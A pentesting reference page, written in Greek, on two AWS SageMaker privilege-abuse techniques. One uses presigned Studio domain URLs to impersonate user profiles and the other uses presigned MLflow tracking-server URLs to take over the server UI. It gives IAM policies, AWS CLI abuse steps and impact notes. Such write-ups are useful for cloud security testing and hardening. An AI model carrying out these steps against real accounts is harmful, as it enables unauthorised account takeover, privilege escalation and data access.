# AWS - SageMaker Μη Εξουσιοδοτημένη Πρόσβαση

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Απαλλοτρίωση λογαριασμού μέσω CreatePresignedDomainUrl (Προσποίηση οποιουδήποτε UserProfile)

### Περιγραφή
Μια ταυτότητα με δικαίωμα να καλεί `sagemaker:CreatePresignedDomainUrl` σε έναν στοχευμένο Studio `UserProfile` μπορεί να δημιουργήσει ένα URL σύνδεσης που αυθεντικοποιεί απευθείας στο SageMaker Studio ως αυτό το προφίλ. Αυτό παρέχει στο πρόγραμμα περιήγησης του επιτιθέμενου μια Studio συνεδρία που κληρονομεί τα δικαιώματα `ExecutionRole` του προφίλ και πλήρη πρόσβαση στο home του προφίλ που βασίζεται σε EFS και στις εφαρμογές του. Δεν απαιτείται `iam:PassRole` ή πρόσβαση στην κονσόλα.

### Απαιτήσεις
- Ένα SageMaker Studio `Domain` και ένα στοχευμένο `UserProfile` μέσα σε αυτό.
- Ο principal του επιτιθέμενου χρειάζεται `sagemaker:CreatePresignedDomainUrl` στο στοχευμένο `UserProfile` (σε επίπεδο πόρου) ή `*`.

Παράδειγμα ελάχιστης πολιτικής (περιορισμένο σε ένα UserProfile):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Βήματα Κατάχρησης

1) Εντοπίστε ένα Studio Domain και UserProfiles που μπορείτε να στοχοποιήσετε
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Δημιουργήστε ένα presigned URL (έγκυρο για ~5 λεπτά από προεπιλογή)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Άνοιξε το επιστρεφόμενο URL σε έναν περιηγητή για να συνδεθείς στο Studio ως ο στοχευόμενος χρήστης. Σε ένα Jupyter τερματικό μέσα στο Studio επαλήθευσε την ενεργή ταυτότητα:
```bash
aws sts get-caller-identity
```
Notes:
- `--landing-uri` μπορεί να παραληφθεί. Ορισμένες τιμές (π.χ., `app:JupyterLab:/lab`) ενδέχεται να απορριφθούν ανάλογα με τη διανομή/έκδοση του Studio· οι προεπιλογές συνήθως ανακατευθύνουν στην αρχική σελίδα του Studio και στη συνέχεια στο Jupyter.
- Οι πολιτικές του οργανισμού/περιορισμοί endpoint VPC μπορεί να μπλοκάρουν ακόμη την πρόσβαση στο δίκτυο· η δημιουργία του token δεν απαιτεί σύνδεση στην κονσόλα ή `iam:PassRole`.

### Επιπτώσεις
- Lateral movement και privilege escalation με ανάληψη οποιουδήποτε Studio `UserProfile` του οποίου το ARN επιτρέπεται, κληρονομώντας το `ExecutionRole` του και το filesystem/apps.

### Αποδεικτικά στοιχεία (από ελεγχόμενη δοκιμή)
- Με μόνο το `sagemaker:CreatePresignedDomainUrl` σε ένα στοχευμένο `UserProfile`, ο ρόλος του επιτιθέμενου επέστρεψε με επιτυχία ένα `AuthorizedUrl` όπως:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Μια άμεση HTTP αίτηση απαντά με ανακατεύθυνση (HTTP 302) προς το Studio, επιβεβαιώνοντας ότι το URL είναι έγκυρο και ενεργό μέχρι τη λήξη του.


## SageMaker MLflow Tracking Server - ATO μέσω CreatePresignedMlflowTrackingServerUrl

### Περιγραφή
Μια ταυτότητα με άδεια να καλεί `sagemaker:CreatePresignedMlflowTrackingServerUrl` για έναν στοχευόμενο SageMaker MLflow Tracking Server μπορεί να δημιουργήσει ένα presigned URL μίας χρήσης που αυθεντικοποιείται απευθείας στο managed MLflow UI αυτού του server. Αυτό παρέχει την ίδια πρόσβαση που θα είχε ένας νόμιμος χρήστης στον server (προβολή/δημιουργία experiments και runs, και λήψη/ανέβασμα artifacts στο S3 artifact store του server) χωρίς πρόσβαση στο console ή `iam:PassRole`.

### Απαιτήσεις
- Ένας SageMaker MLflow Tracking Server στον account/region και το όνομά του.
- Ο attacker principal χρειάζεται `sagemaker:CreatePresignedMlflowTrackingServerUrl` στο target MLflow Tracking Server resource (ή `*`).

Minimal policy example (scoped to one Tracking Server):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Βήματα Κατάχρησης

1) Καταγράψτε τους MLflow Tracking Servers που μπορείτε να στοχεύσετε και επιλέξτε ένα όνομα
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Δημιουργήστε ένα presigned MLflow UI URL (ισχύει για μικρό χρονικό διάστημα)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Ανοίξτε το επιστρεφόμενο URL σε ένα πρόγραμμα περιήγησης για να αποκτήσετε πρόσβαση στο MLflow UI ως επαληθευμένος χρήστης για αυτόν τον Tracking Server.

Notes:
- Ο Tracking Server πρέπει να βρίσκεται σε κατάσταση έτοιμη (π.χ., `Created/Active`). Αν εξακολουθεί να είναι `Creating`, η κλήση θα απορριφθεί.
- Το presigned URL είναι μιας χρήσης και βραχύβιο· δημιουργήστε νέο όταν χρειάζεται.

### Επιπτώσεις
- Άμεση πρόσβαση στο διαχειριζόμενο MLflow UI για τον στοχευμένο Tracking Server, επιτρέποντας την προβολή και τροποποίηση experiments/runs καθώς και την ανάκτηση ή μεταφόρτωση artifacts που αποθηκεύονται στο ρυθμισμένο S3 artifact store του server, εντός των δικαιωμάτων που επιβάλλει η διαμόρφωση του server.

{{#include ../../../../banners/hacktricks-training.md}}
